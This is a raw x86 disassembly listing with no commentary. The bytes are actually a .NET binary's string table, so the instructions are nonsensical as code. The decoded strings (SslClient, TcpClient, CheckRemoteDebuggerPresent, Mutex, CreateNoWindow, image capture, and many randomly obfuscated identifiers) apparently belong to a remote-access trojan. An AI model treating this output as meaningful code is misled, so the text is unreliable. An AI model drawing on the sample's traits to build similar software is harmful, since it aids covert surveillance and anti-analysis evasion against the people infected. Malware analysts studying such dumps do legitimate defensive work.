  40948f:	74 72                	je     0x409503
  409491:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409498:	74 4f                	je     0x4094e9
  40949a:	70 74                	jo     0x409510
  40949c:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  4094a3:	74 49                	je     0x4094ee
  4094a5:	6d                   	insl   (%dx),%es:(%edi)
  4094a6:	61                   	popa
  4094a7:	67 65 44             	addr16 gs inc %esp
  4094aa:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4094ae:	65 72 73             	gs jb  0x409524
  4094b1:	00 52 75             	add    %dl,0x75(%edx)
  4094b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4094b5:	74 69                	je     0x409520
  4094b7:	6d                   	insl   (%dx),%es:(%edi)
  4094b8:	65 48                	gs dec %eax
  4094ba:	65 6c                	gs insb (%dx),%es:(%edi)
  4094bc:	70 65                	jo     0x409523
  4094be:	72 73                	jb     0x409533
  4094c0:	00 53 73             	add    %dl,0x73(%ebx)
  4094c3:	6c                   	insb   (%dx),%es:(%edi)
  4094c4:	50                   	push   %eax
  4094c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4094c6:	6c                   	insb   (%dx),%es:(%edi)
  4094c7:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4094ce:	72 73                	jb     0x409543
  4094d0:	00 46 69             	add    %al,0x69(%esi)
  4094d3:	6c                   	insb   (%dx),%es:(%edi)
  4094d4:	65 41                	gs inc %ecx
  4094d6:	63 63 65             	arpl   %esp,0x65(%ebx)
  4094d9:	73 73                	jae    0x40954e
  4094db:	00 47 65             	add    %al,0x65(%edi)
  4094de:	74 43                	je     0x409523
  4094e0:	75 72                	jne    0x409554
  4094e2:	72 65                	jb     0x409549
  4094e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e5:	74 50                	je     0x409537
  4094e7:	72 6f                	jb     0x409558
  4094e9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4094ec:	73 00                	jae    0x4094ee
  4094ee:	49                   	dec    %ecx
  4094ef:	50                   	push   %eax
  4094f0:	41                   	inc    %ecx
  4094f1:	64 64 72 65          	fs fs jb 0x40955a
  4094f5:	73 73                	jae    0x40956a
  4094f7:	00 53 79             	add    %dl,0x79(%ebx)
  4094fa:	73 74                	jae    0x409570
  4094fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4094fe:	2e 4e                	cs dec %esi
  409500:	65 74 2e             	gs je  0x409531
  409503:	53                   	push   %ebx
  409504:	6f                   	outsl  %ds:(%esi),(%dx)
  409505:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409508:	74 73                	je     0x40957d
  40950a:	00 73 65             	add    %dh,0x65(%ebx)
  40950d:	74 5f                	je     0x40956e
  40950f:	41                   	inc    %ecx
  409510:	72 67                	jb     0x409579
  409512:	75 6d                	jne    0x409581
  409514:	65 6e                	outsb  %gs:(%esi),(%dx)
  409516:	74 73                	je     0x40958b
  409518:	00 53 79             	add    %dl,0x79(%ebx)
  40951b:	73 74                	jae    0x409591
  40951d:	65 6d                	gs insl (%dx),%es:(%edi)
  40951f:	45                   	inc    %ebp
  409520:	76 65                	jbe    0x409587
  409522:	6e                   	outsb  %ds:(%esi),(%dx)
  409523:	74 73                	je     0x409598
  409525:	00 45 78             	add    %al,0x78(%ebp)
  409528:	69 73 74 73 00 79 61 	imul   $0x61790073,0x74(%ebx),%esi
  40952f:	6a 58                	push   $0x58
  409531:	53                   	push   %ebx
  409532:	74 54                	je     0x409588
  409534:	6f                   	outsl  %ds:(%esi),(%dx)
  409535:	68 5a 5a 50 74       	push   $0x74505a5a
  40953a:	00 68 6a             	add    %ch,0x6a(%eax)
  40953d:	63 53 6c             	arpl   %edx,0x6c(%ebx)
  409540:	6f                   	outsl  %ds:(%esi),(%dx)
  409541:	4e                   	dec    %esi
  409542:	78 58                	js     0x40959c
  409544:	5a                   	pop    %edx
  409545:	45                   	inc    %ebp
  409546:	55                   	push   %ebp
  409547:	74 00                	je     0x409549
  409549:	57                   	push   %edi
  40954a:	61                   	popa
  40954b:	45                   	inc    %ebp
  40954c:	74 7a                	je     0x4095c8
  40954e:	70 4f                	jo     0x40959f
  409550:	41                   	inc    %ecx
  409551:	4f                   	dec    %edi
  409552:	56                   	push   %esi
  409553:	74 00                	je     0x409555
  409555:	77 67                	ja     0x4095be
  409557:	6e                   	outsb  %ds:(%esi),(%dx)
  409558:	46                   	inc    %esi
  409559:	6d                   	insl   (%dx),%es:(%edi)
  40955a:	4c                   	dec    %esp
  40955b:	6c                   	insb   (%dx),%es:(%edi)
  40955c:	55                   	push   %ebp
  40955d:	49                   	dec    %ecx
  40955e:	4b                   	dec    %ebx
  40955f:	75 59                	jne    0x4095ba
  409561:	74 00                	je     0x409563
  409563:	43                   	inc    %ebx
  409564:	6f                   	outsl  %ds:(%esi),(%dx)
  409565:	6e                   	outsb  %ds:(%esi),(%dx)
  409566:	63 61 74             	arpl   %esp,0x74(%ecx)
  409569:	00 49 6d             	add    %cl,0x6d(%ecx)
  40956c:	61                   	popa
  40956d:	67 65 46             	addr16 gs inc %esi
  409570:	6f                   	outsl  %ds:(%esi),(%dx)
  409571:	72 6d                	jb     0x4095e0
  409573:	61                   	popa
  409574:	74 00                	je     0x409576
  409576:	67 65 74 5f          	addr16 gs je 0x4095d9
  40957a:	41                   	inc    %ecx
  40957b:	73 46                	jae    0x4095c3
  40957d:	6c                   	insb   (%dx),%es:(%edi)
  40957e:	6f                   	outsl  %ds:(%esi),(%dx)
  40957f:	61                   	popa
  409580:	74 00                	je     0x409582
  409582:	73 65                	jae    0x4095e9
  409584:	74 5f                	je     0x4095e5
  409586:	41                   	inc    %ecx
  409587:	73 46                	jae    0x4095cf
  409589:	6c                   	insb   (%dx),%es:(%edi)
  40958a:	6f                   	outsl  %ds:(%esi),(%dx)
  40958b:	61                   	popa
  40958c:	74 00                	je     0x40958e
  40958e:	4d                   	dec    %ebp
  40958f:	61                   	popa
  409590:	6e                   	outsb  %ds:(%esi),(%dx)
  409591:	61                   	popa
  409592:	67 65 6d             	gs insl (%dx),%es:(%di)
  409595:	65 6e                	outsb  %gs:(%esi),(%dx)
  409597:	74 42                	je     0x4095db
  409599:	61                   	popa
  40959a:	73 65                	jae    0x409601
  40959c:	4f                   	dec    %edi
  40959d:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095a0:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  4095a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4095a5:	6c                   	insb   (%dx),%es:(%edi)
  4095a6:	6c                   	insb   (%dx),%es:(%edi)
  4095a7:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  4095ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4095af:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  4095b4:	65 74 00             	gs je  0x4095b7
  4095b7:	53                   	push   %ebx
  4095b8:	79 73                	jns    0x40962d
  4095ba:	74 65                	je     0x409621
  4095bc:	6d                   	insl   (%dx),%es:(%edi)
  4095bd:	2e 4e                	cs dec %esi
  4095bf:	65 74 00             	gs je  0x4095c2
  4095c2:	66 49                	dec    %cx
  4095c4:	75 44                	jne    0x40960a
  4095c6:	47                   	inc    %edi
  4095c7:	52                   	push   %edx
  4095c8:	55                   	push   %ebp
  4095c9:	47                   	inc    %edi
  4095ca:	75 6d                	jne    0x409639
  4095cc:	61                   	popa
  4095cd:	65 74 00             	gs je  0x4095d0
  4095d0:	54                   	push   %esp
  4095d1:	61                   	popa
  4095d2:	72 67                	jb     0x40963b
  4095d4:	65 74 00             	gs je  0x4095d7
  4095d7:	53                   	push   %ebx
  4095d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4095dc:	74 00                	je     0x4095de
  4095de:	53                   	push   %ebx
  4095df:	79 73                	jns    0x409654
  4095e1:	74 65                	je     0x409648
  4095e3:	6d                   	insl   (%dx),%es:(%edi)
  4095e4:	2e 43                	cs inc %ebx
  4095e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e7:	6c                   	insb   (%dx),%es:(%edi)
  4095e8:	6c                   	insb   (%dx),%es:(%edi)
  4095e9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ef:	73 2e                	jae    0x40961f
  4095f1:	49                   	dec    %ecx
  4095f2:	45                   	inc    %ebp
  4095f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095f4:	75 6d                	jne    0x409663
  4095f6:	65 72 61             	gs jb  0x40965a
  4095f9:	74 6f                	je     0x40966a
  4095fb:	72 2e                	jb     0x40962b
  4095fd:	52                   	push   %edx
  4095fe:	65 73 65             	gs jae 0x409666
  409601:	74 00                	je     0x409603
  409603:	67 65 74 5f          	addr16 gs je 0x409666
  409607:	4f                   	dec    %edi
  409608:	66 66 73 65          	data16 data16 jae 0x409671
  40960c:	74 00                	je     0x40960e
  40960e:	73 65                	jae    0x409675
  409610:	74 5f                	je     0x409671
  409612:	4f                   	dec    %edi
  409613:	66 66 73 65          	data16 data16 jae 0x40967c
  409617:	74 00                	je     0x409619
  409619:	53                   	push   %ebx
  40961a:	70 6c                	jo     0x409688
  40961c:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409623:	00 
  409624:	53                   	push   %ebx
  409625:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  40962c:	44                   	inc    %esp
  40962d:	65 66 61             	gs popaw
  409630:	75 6c                	jne    0x40969e
  409632:	74 00                	je     0x409634
  409634:	49                   	dec    %ecx
  409635:	41                   	inc    %ecx
  409636:	73 79                	jae    0x4096b1
  409638:	6e                   	outsb  %ds:(%esi),(%dx)
  409639:	63 52 65             	arpl   %edx,0x65(%edx)
  40963c:	73 75                	jae    0x4096b3
  40963e:	6c                   	insb   (%dx),%es:(%edi)
  40963f:	74 00                	je     0x409641
  409641:	54                   	push   %esp
  409642:	6f                   	outsl  %ds:(%esi),(%dx)
  409643:	55                   	push   %ebp
  409644:	70 70                	jo     0x4096b6
  409646:	65 72 49             	gs jb  0x409692
  409649:	6e                   	outsb  %ds:(%esi),(%dx)
  40964a:	76 61                	jbe    0x4096ad
  40964c:	72 69                	jb     0x4096b7
  40964e:	61                   	popa
  40964f:	6e                   	outsb  %ds:(%esi),(%dx)
  409650:	74 00                	je     0x409652
  409652:	57                   	push   %edi
  409653:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409657:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40965e:	74 5f                	je     0x4096bf
  409660:	53                   	push   %ebx
  409661:	73 6c                	jae    0x4096cf
  409663:	43                   	inc    %ebx
  409664:	6c                   	insb   (%dx),%es:(%edi)
  409665:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40966c:	74 5f                	je     0x4096cd
  40966e:	53                   	push   %ebx
  40966f:	73 6c                	jae    0x4096dd
  409671:	43                   	inc    %ebx
  409672:	6c                   	insb   (%dx),%es:(%edi)
  409673:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40967a:	74 5f                	je     0x4096db
  40967c:	54                   	push   %esp
  40967d:	63 70 43             	arpl   %esi,0x43(%eax)
  409680:	6c                   	insb   (%dx),%es:(%edi)
  409681:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409688:	74 5f                	je     0x4096e9
  40968a:	54                   	push   %esp
  40968b:	63 70 43             	arpl   %esi,0x43(%eax)
  40968e:	6c                   	insb   (%dx),%es:(%edi)
  40968f:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409696:	74 68                	je     0x409700
  409698:	65 6e                	outsb  %gs:(%esi),(%dx)
  40969a:	74 69                	je     0x409705
  40969c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40969f:	65 41                	gs inc %ecx
  4096a1:	73 43                	jae    0x4096e6
  4096a3:	6c                   	insb   (%dx),%es:(%edi)
  4096a4:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4096ab:	73 74                	jae    0x409721
  4096ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4096af:	2e 4d                	cs dec %ebp
  4096b1:	61                   	popa
  4096b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4096b3:	61                   	popa
  4096b4:	67 65 6d             	gs insl (%dx),%es:(%di)
  4096b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096b9:	74 00                	je     0x4096bb
  4096bb:	45                   	inc    %ebp
  4096bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096bd:	76 69                	jbe    0x409728
  4096bf:	72 6f                	jb     0x409730
  4096c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c2:	6d                   	insl   (%dx),%es:(%edi)
  4096c3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4096c5:	74 00                	je     0x4096c7
  4096c7:	53                   	push   %ebx
  4096c8:	79 73                	jns    0x40973d
  4096ca:	74 65                	je     0x409731
  4096cc:	6d                   	insl   (%dx),%es:(%edi)
  4096cd:	2e 43                	cs inc %ebx
  4096cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4096d0:	6c                   	insb   (%dx),%es:(%edi)
  4096d1:	6c                   	insb   (%dx),%es:(%edi)
  4096d2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4096d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d8:	73 2e                	jae    0x409708
  4096da:	49                   	dec    %ecx
  4096db:	45                   	inc    %ebp
  4096dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096dd:	75 6d                	jne    0x40974c
  4096df:	65 72 61             	gs jb  0x409743
  4096e2:	74 6f                	je     0x409753
  4096e4:	72 2e                	jb     0x409714
  4096e6:	67 65 74 5f          	addr16 gs je 0x409749
  4096ea:	43                   	inc    %ebx
  4096eb:	75 72                	jne    0x40975f
  4096ed:	72 65                	jb     0x409754
  4096ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f0:	74 00                	je     0x4096f2
  4096f2:	47                   	inc    %edi
  4096f3:	65 74 43             	gs je  0x409739
  4096f6:	75 72                	jne    0x40976a
  4096f8:	72 65                	jb     0x40975f
  4096fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4096fb:	74 00                	je     0x4096fd
  4096fd:	43                   	inc    %ebx
  4096fe:	68 65 63 6b 52       	push   $0x526b6365
  409703:	65 6d                	gs insl (%dx),%es:(%edi)
  409705:	6f                   	outsl  %ds:(%esi),(%dx)
  409706:	74 65                	je     0x40976d
  409708:	44                   	inc    %esp
  409709:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40970d:	67 65 72 50          	addr16 gs jb 0x409761
  409711:	72 65                	jb     0x409778
  409713:	73 65                	jae    0x40977a
  409715:	6e                   	outsb  %ds:(%esi),(%dx)
  409716:	74 00                	je     0x409718
  409718:	67 65 74 5f          	addr16 gs je 0x40977b
  40971c:	52                   	push   %edx
  40971d:	65 6d                	gs insl (%dx),%es:(%edi)
  40971f:	6f                   	outsl  %ds:(%esi),(%dx)
  409720:	74 65                	je     0x409787
  409722:	45                   	inc    %ebp
  409723:	6e                   	outsb  %ds:(%esi),(%dx)
  409724:	64 50                	fs push %eax
  409726:	6f                   	outsl  %ds:(%esi),(%dx)
  409727:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40972e:	5f                   	pop    %edi
  40972f:	43                   	inc    %ebx
  409730:	6f                   	outsl  %ds:(%esi),(%dx)
  409731:	75 6e                	jne    0x4097a1
  409733:	74 00                	je     0x409735
  409735:	67 65 74 5f          	addr16 gs je 0x409798
  409739:	50                   	push   %eax
  40973a:	72 6f                	jb     0x4097ab
  40973c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40973f:	73 6f                	jae    0x4097b0
  409741:	72 43                	jb     0x409786
  409743:	6f                   	outsl  %ds:(%esi),(%dx)
  409744:	75 6e                	jne    0x4097b4
  409746:	74 00                	je     0x409748
  409748:	47                   	inc    %edi
  409749:	65 74 50             	gs je  0x40979c
  40974c:	61                   	popa
  40974d:	74 68                	je     0x4097b7
  40974f:	52                   	push   %edx
  409750:	6f                   	outsl  %ds:(%esi),(%dx)
  409751:	6f                   	outsl  %ds:(%esi),(%dx)
  409752:	74 00                	je     0x409754
  409754:	50                   	push   %eax
  409755:	61                   	popa
  409756:	72 61                	jb     0x4097b9
  409758:	6d                   	insl   (%dx),%es:(%edi)
  409759:	65 74 65             	gs je  0x4097c1
  40975c:	72 69                	jb     0x4097c7
  40975e:	7a 65                	jp     0x4097c5
  409760:	64 54                	fs push %esp
  409762:	68 72 65 61 64       	push   $0x64616572
  409767:	53                   	push   %ebx
  409768:	74 61                	je     0x4097cb
  40976a:	72 74                	jb     0x4097e0
  40976c:	00 43 6f             	add    %al,0x6f(%ebx)
  40976f:	6e                   	outsb  %ds:(%esi),(%dx)
  409770:	76 65                	jbe    0x4097d7
  409772:	72 74                	jb     0x4097e8
  409774:	00 43 61             	add    %al,0x61(%ebx)
  409777:	73 74                	jae    0x4097ed
  409779:	00 46 61             	add    %al,0x61(%esi)
  40977c:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409783:	54 
  409784:	6f                   	outsl  %ds:(%esi),(%dx)
  409785:	4c                   	dec    %esp
  409786:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  40978d:	74 65                	je     0x4097f4
  40978f:	6d                   	insl   (%dx),%es:(%edi)
  409790:	2e 43                	cs inc %ebx
  409792:	6f                   	outsl  %ds:(%esi),(%dx)
  409793:	6c                   	insb   (%dx),%es:(%edi)
  409794:	6c                   	insb   (%dx),%es:(%edi)
  409795:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40979a:	6e                   	outsb  %ds:(%esi),(%dx)
  40979b:	73 2e                	jae    0x4097cb
  40979d:	49                   	dec    %ecx
  40979e:	45                   	inc    %ebp
  40979f:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a0:	75 6d                	jne    0x40980f
  4097a2:	65 72 61             	gs jb  0x409806
  4097a5:	74 6f                	je     0x409816
  4097a7:	72 2e                	jb     0x4097d7
  4097a9:	4d                   	dec    %ebp
  4097aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ab:	76 65                	jbe    0x409812
  4097ad:	4e                   	dec    %esi
  4097ae:	65 78 74             	gs js  0x409825
  4097b1:	00 53 79             	add    %dl,0x79(%ebx)
  4097b4:	73 74                	jae    0x40982a
  4097b6:	65 6d                	gs insl (%dx),%es:(%edi)
  4097b8:	2e 54                	cs push %esp
  4097ba:	65 78 74             	gs js  0x409831
  4097bd:	00 6b 4d             	add    %ch,0x4d(%ebx)
  4097c0:	58                   	pop    %eax
  4097c1:	51                   	push   %ecx
  4097c2:	42                   	inc    %edx
  4097c3:	48                   	dec    %eax
  4097c4:	73 76                	jae    0x40983c
  4097c6:	41                   	inc    %ecx
  4097c7:	75 00                	jne    0x4097c9
  4097c9:	59                   	pop    %ecx
  4097ca:	6b 72 58 77          	imul   $0x77,0x58(%edx),%esi
  4097ce:	59                   	pop    %ecx
  4097cf:	7a 65                	jp     0x409836
  4097d1:	54                   	push   %esp
  4097d2:	72 73                	jb     0x409847
  4097d4:	49                   	dec    %ecx
  4097d5:	75 00                	jne    0x4097d7
  4097d7:	7a 75                	jp     0x40984e
  4097d9:	75 4d                	jne    0x409828
  4097db:	4b                   	dec    %ebx
  4097dc:	64 73 6a             	fs jae 0x409849
  4097df:	6d                   	insl   (%dx),%es:(%edi)
  4097e0:	71 4d                	jno    0x40982f
  4097e2:	75 00                	jne    0x4097e4
  4097e4:	79 4b                	jns    0x409831
  4097e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e7:	79 42                	jns    0x40982b
  4097e9:	49                   	dec    %ecx
  4097ea:	72 74                	jb     0x409860
  4097ec:	45                   	inc    %ebp
  4097ed:	62 75 00             	bound  %esi,0x0(%ebp)
  4097f0:	4f                   	dec    %edi
  4097f1:	4c                   	dec    %esp
  4097f2:	53                   	push   %ebx
  4097f3:	46                   	inc    %esi
  4097f4:	74 76                	je     0x40986c
  4097f6:	4c                   	dec    %esp
  4097f7:	53                   	push   %ebx
  4097f8:	47                   	inc    %edi
  4097f9:	67 75 00             	addr16 jne 0x4097fc
  4097fc:	7a 56                	jp     0x409854
  4097fe:	68 59 78 74 62       	push   $0x62747859
  409803:	46                   	inc    %esi
  409804:	71 68                	jno    0x40986e
  409806:	75 00                	jne    0x409808
  409808:	49                   	dec    %ecx
  409809:	49                   	dec    %ecx
  40980a:	69 65 48 6e 66 70 6d 	imul   $0x6d70666e,0x48(%ebp),%esp
  409811:	54                   	push   %esp
  409812:	54                   	push   %esp
  409813:	6c                   	insb   (%dx),%es:(%edi)
  409814:	75 00                	jne    0x409816
  409816:	47                   	inc    %edi
  409817:	71 53                	jno    0x40986c
  409819:	76 59                	jbe    0x409874
  40981b:	72 48                	jb     0x409865
  40981d:	4c                   	dec    %esp
  40981e:	46                   	inc    %esi
  40981f:	79 75                	jns    0x409896
  409821:	00 77 67             	add    %dh,0x67(%edi)
  409824:	59                   	pop    %ecx
  409825:	59                   	pop    %ecx
  409826:	4f                   	dec    %edi
  409827:	63 42 76             	arpl   %eax,0x76(%edx)
  40982a:	58                   	pop    %eax
  40982b:	47                   	inc    %edi
  40982c:	59                   	pop    %ecx
  40982d:	55                   	push   %ebp
  40982e:	43                   	inc    %ebx
  40982f:	76 00                	jbe    0x409831
  409831:	69 7a 6d 53 4c 79 56 	imul   $0x56794c53,0x6d(%edx),%edi
  409838:	44                   	inc    %esp
  409839:	54                   	push   %esp
  40983a:	76 00                	jbe    0x40983c
  40983c:	49                   	dec    %ecx
  40983d:	79 6c                	jns    0x4098ab
  40983f:	64 79 58             	fs jns 0x40989a
  409842:	66 73 51             	data16 jae 0x409896
  409845:	56                   	push   %esi
  409846:	6f                   	outsl  %ds:(%esi),(%dx)
  409847:	57                   	push   %edi
  409848:	76 00                	jbe    0x40984a
  40984a:	66 44                	inc    %sp
  40984c:	72 71                	jb     0x4098bf
  40984e:	73 4c                	jae    0x40989c
  409850:	53                   	push   %ebx
  409851:	61                   	popa
  409852:	4d                   	dec    %ebp
  409853:	47                   	inc    %edi
  409854:	69 76 00 78 65 77 75 	imul   $0x75776578,0x0(%esi),%esi
  40985b:	43                   	inc    %ebx
  40985c:	74 6b                	je     0x4098c9
  40985e:	6f                   	outsl  %ds:(%esi),(%dx)
  40985f:	53                   	push   %ebx
  409860:	63 6d 76             	arpl   %ebp,0x76(%ebp)
  409863:	00 45 73             	add    %al,0x73(%ebp)
  409866:	62 68 78             	bound  %ebp,0x78(%eax)
  409869:	54                   	push   %esp
  40986a:	76 67                	jbe    0x4098d3
  40986c:	52                   	push   %edx
  40986d:	4d                   	dec    %ebp
  40986e:	77 00                	ja     0x409870
  409870:	4e                   	dec    %esi
  409871:	67 45                	addr16 inc %ebp
  409873:	65 70 47             	gs jo  0x4098bd
  409876:	78 58                	js     0x4098d0
  409878:	52                   	push   %edx
  409879:	77 00                	ja     0x40987b
  40987b:	76 44                	jbe    0x4098c1
  40987d:	45                   	inc    %ebp
  40987e:	55                   	push   %ebp
  40987f:	45                   	inc    %ebp
  409880:	74 71                	je     0x4098f3
  409882:	6a 5a                	push   $0x5a
  409884:	57                   	push   %edi
  409885:	77 00                	ja     0x409887
  409887:	6f                   	outsl  %ds:(%esi),(%dx)
  409888:	51                   	push   %ecx
  409889:	5a                   	pop    %edx
  40988a:	54                   	push   %esp
  40988b:	4e                   	dec    %esi
  40988c:	74 72                	je     0x409900
  40988e:	69 59 48 61 6a 77 00 	imul   $0x776a61,0x48(%ecx),%ebx
  409895:	46                   	inc    %esi
  409896:	4e                   	dec    %esi
  409897:	78 67                	js     0x409900
  409899:	6f                   	outsl  %ds:(%esi),(%dx)
  40989a:	51                   	push   %ecx
  40989b:	70 70                	jo     0x40990d
  40989d:	79 58                	jns    0x4098f7
  40989f:	6b 77 00 73          	imul   $0x73,0x0(%edi),%esi
  4098a3:	65 74 5f             	gs je  0x409905
  4098a6:	43                   	inc    %ebx
  4098a7:	72 65                	jb     0x40990e
  4098a9:	61                   	popa
  4098aa:	74 65                	je     0x409911
  4098ac:	4e                   	dec    %esi
  4098ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ae:	57                   	push   %edi
  4098af:	69 6e 64 6f 77 00 56 	imul   $0x5600776f,0x64(%esi),%ebp
  4098b6:	57                   	push   %edi
  4098b7:	5a                   	pop    %edx
  4098b8:	45                   	inc    %ebp
  4098b9:	74 67                	je     0x409922
  4098bb:	6c                   	insb   (%dx),%es:(%edi)
  4098bc:	46                   	inc    %esi
  4098bd:	63 4e 77             	arpl   %ecx,0x77(%esi)
  4098c0:	77 00                	ja     0x4098c2
  4098c2:	6d                   	insl   (%dx),%es:(%edi)
  4098c3:	62 77 56             	bound  %esi,0x56(%edi)
  4098c6:	67 58                	addr16 pop %eax
  4098c8:	4f                   	dec    %edi
  4098c9:	70 42                	jo     0x40990d
  4098cb:	78 00                	js     0x4098cd
  4098cd:	4b                   	dec    %ebx
  4098ce:	70 63                	jo     0x409933
  4098d0:	65 6f                	outsl  %gs:(%esi),(%dx)
  4098d2:	4c                   	dec    %esp
  4098d3:	43                   	inc    %ebx
  4098d4:	57                   	push   %edi
  4098d5:	49                   	dec    %ecx
  4098d6:	78 00                	js     0x4098d8
  4098d8:	78 4d                	js     0x409927
  4098da:	61                   	popa
  4098db:	54                   	push   %esp
  4098dc:	4c                   	dec    %esp
  4098dd:	46                   	inc    %esi
  4098de:	50                   	push   %eax
  4098df:	48                   	dec    %eax
  4098e0:	74 73                	je     0x409955
  4098e2:	4b                   	dec    %ebx
  4098e3:	78 00                	js     0x4098e5
  4098e5:	42                   	inc    %edx
  4098e6:	72 4d                	jb     0x409935
  4098e8:	4e                   	dec    %esi
  4098e9:	4e                   	dec    %esi
  4098ea:	4b                   	dec    %ebx
  4098eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ec:	70 4c                	jo     0x40993a
  4098ee:	78 00                	js     0x4098f0
  4098f0:	5a                   	pop    %edx
  4098f1:	44                   	inc    %esp
  4098f2:	70 43                	jo     0x409937
  4098f4:	6d                   	insl   (%dx),%es:(%edi)
  4098f5:	67 73 61             	addr16 jae 0x409959
  4098f8:	69 6c 63 4e 78 00 6f 	imul   $0x4c6f0078,0x4e(%ebx,%eiz,2),%ebp
  4098ff:	4c 
  409900:	4e                   	dec    %esi
  409901:	68 42 50 54 59       	push   $0x59545042
  409906:	68 76 48 78 4e       	push   $0x4e784876
  40990b:	78 00                	js     0x40990d
  40990d:	5a                   	pop    %edx
  40990e:	4c                   	dec    %esp
  40990f:	5a                   	pop    %edx
  409910:	5a                   	pop    %edx
  409911:	52                   	push   %edx
  409912:	69 4c 69 78 59 53 51 	imul   $0x78515359,0x78(%ecx,%ebp,2),%ecx
  409919:	78 
  40991a:	00 70 4d             	add    %dh,0x4d(%eax)
  40991d:	4c                   	dec    %esp
  40991e:	52                   	push   %edx
  40991f:	4a                   	dec    %edx
  409920:	52                   	push   %edx
  409921:	6c                   	insb   (%dx),%es:(%edi)
  409922:	70 4b                	jo     0x40996f
  409924:	7a 4a                	jp     0x409970
  409926:	4a                   	dec    %edx
  409927:	55                   	push   %ebp
  409928:	78 00                	js     0x40992a
  40992a:	51                   	push   %ecx
  40992b:	74 62                	je     0x40998f
  40992d:	71 58                	jno    0x409987
  40992f:	62 6a 46             	bound  %ebp,0x46(%edx)
  409932:	66 4a                	dec    %dx
  409934:	42                   	inc    %edx
  409935:	64 78 00             	fs js  0x409938
  409938:	4d                   	dec    %ebp
  409939:	75 74                	jne    0x4099af
  40993b:	65 78 00             	gs js  0x40993e
  40993e:	52                   	push   %edx
  40993f:	78 6a                	js     0x4099ab
  409941:	5a                   	pop    %edx
  409942:	4e                   	dec    %esi
  409943:	67 68 64 59 67 78    	addr16 push $0x78675964
  409949:	00 79 4c             	add    %bh,0x4c(%ecx)
  40994c:	4c                   	dec    %esp
  40994d:	6b 65 46 6d          	imul   $0x6d,0x46(%ebp),%esp
  409951:	61                   	popa
  409952:	53                   	push   %ebx
  409953:	42                   	inc    %edx
  409954:	4e                   	dec    %esi
  409955:	79 00                	jns    0x409957
  409957:	66 70 4c             	data16 jo 0x4099a6
  40995a:	42                   	inc    %edx
  40995b:	65 72 4a             	gs jb  0x4099a8
  40995e:	4d                   	dec    %ebp
  40995f:	76 46                	jbe    0x4099a7
  409961:	78 73                	js     0x4099d6
  409963:	50                   	push   %eax
  409964:	79 00                	jns    0x409966
  409966:	4f                   	dec    %edi
  409967:	46                   	inc    %esi
  409968:	52                   	push   %edx
  409969:	48                   	dec    %eax
  40996a:	4f                   	dec    %edi
  40996b:	47                   	inc    %edi
  40996c:	47                   	inc    %edi
  40996d:	72 5a                	jb     0x4099c9
  40996f:	59                   	pop    %ecx
  409970:	79 52                	jns    0x4099c4
  409972:	79 00                	jns    0x409974
  409974:	75 4e                	jne    0x4099c4
  409976:	4a                   	dec    %edx
  409977:	66 6c                	data16 insb (%dx),%es:(%edi)
  409979:	4d                   	dec    %ebp
  40997a:	4c                   	dec    %esp
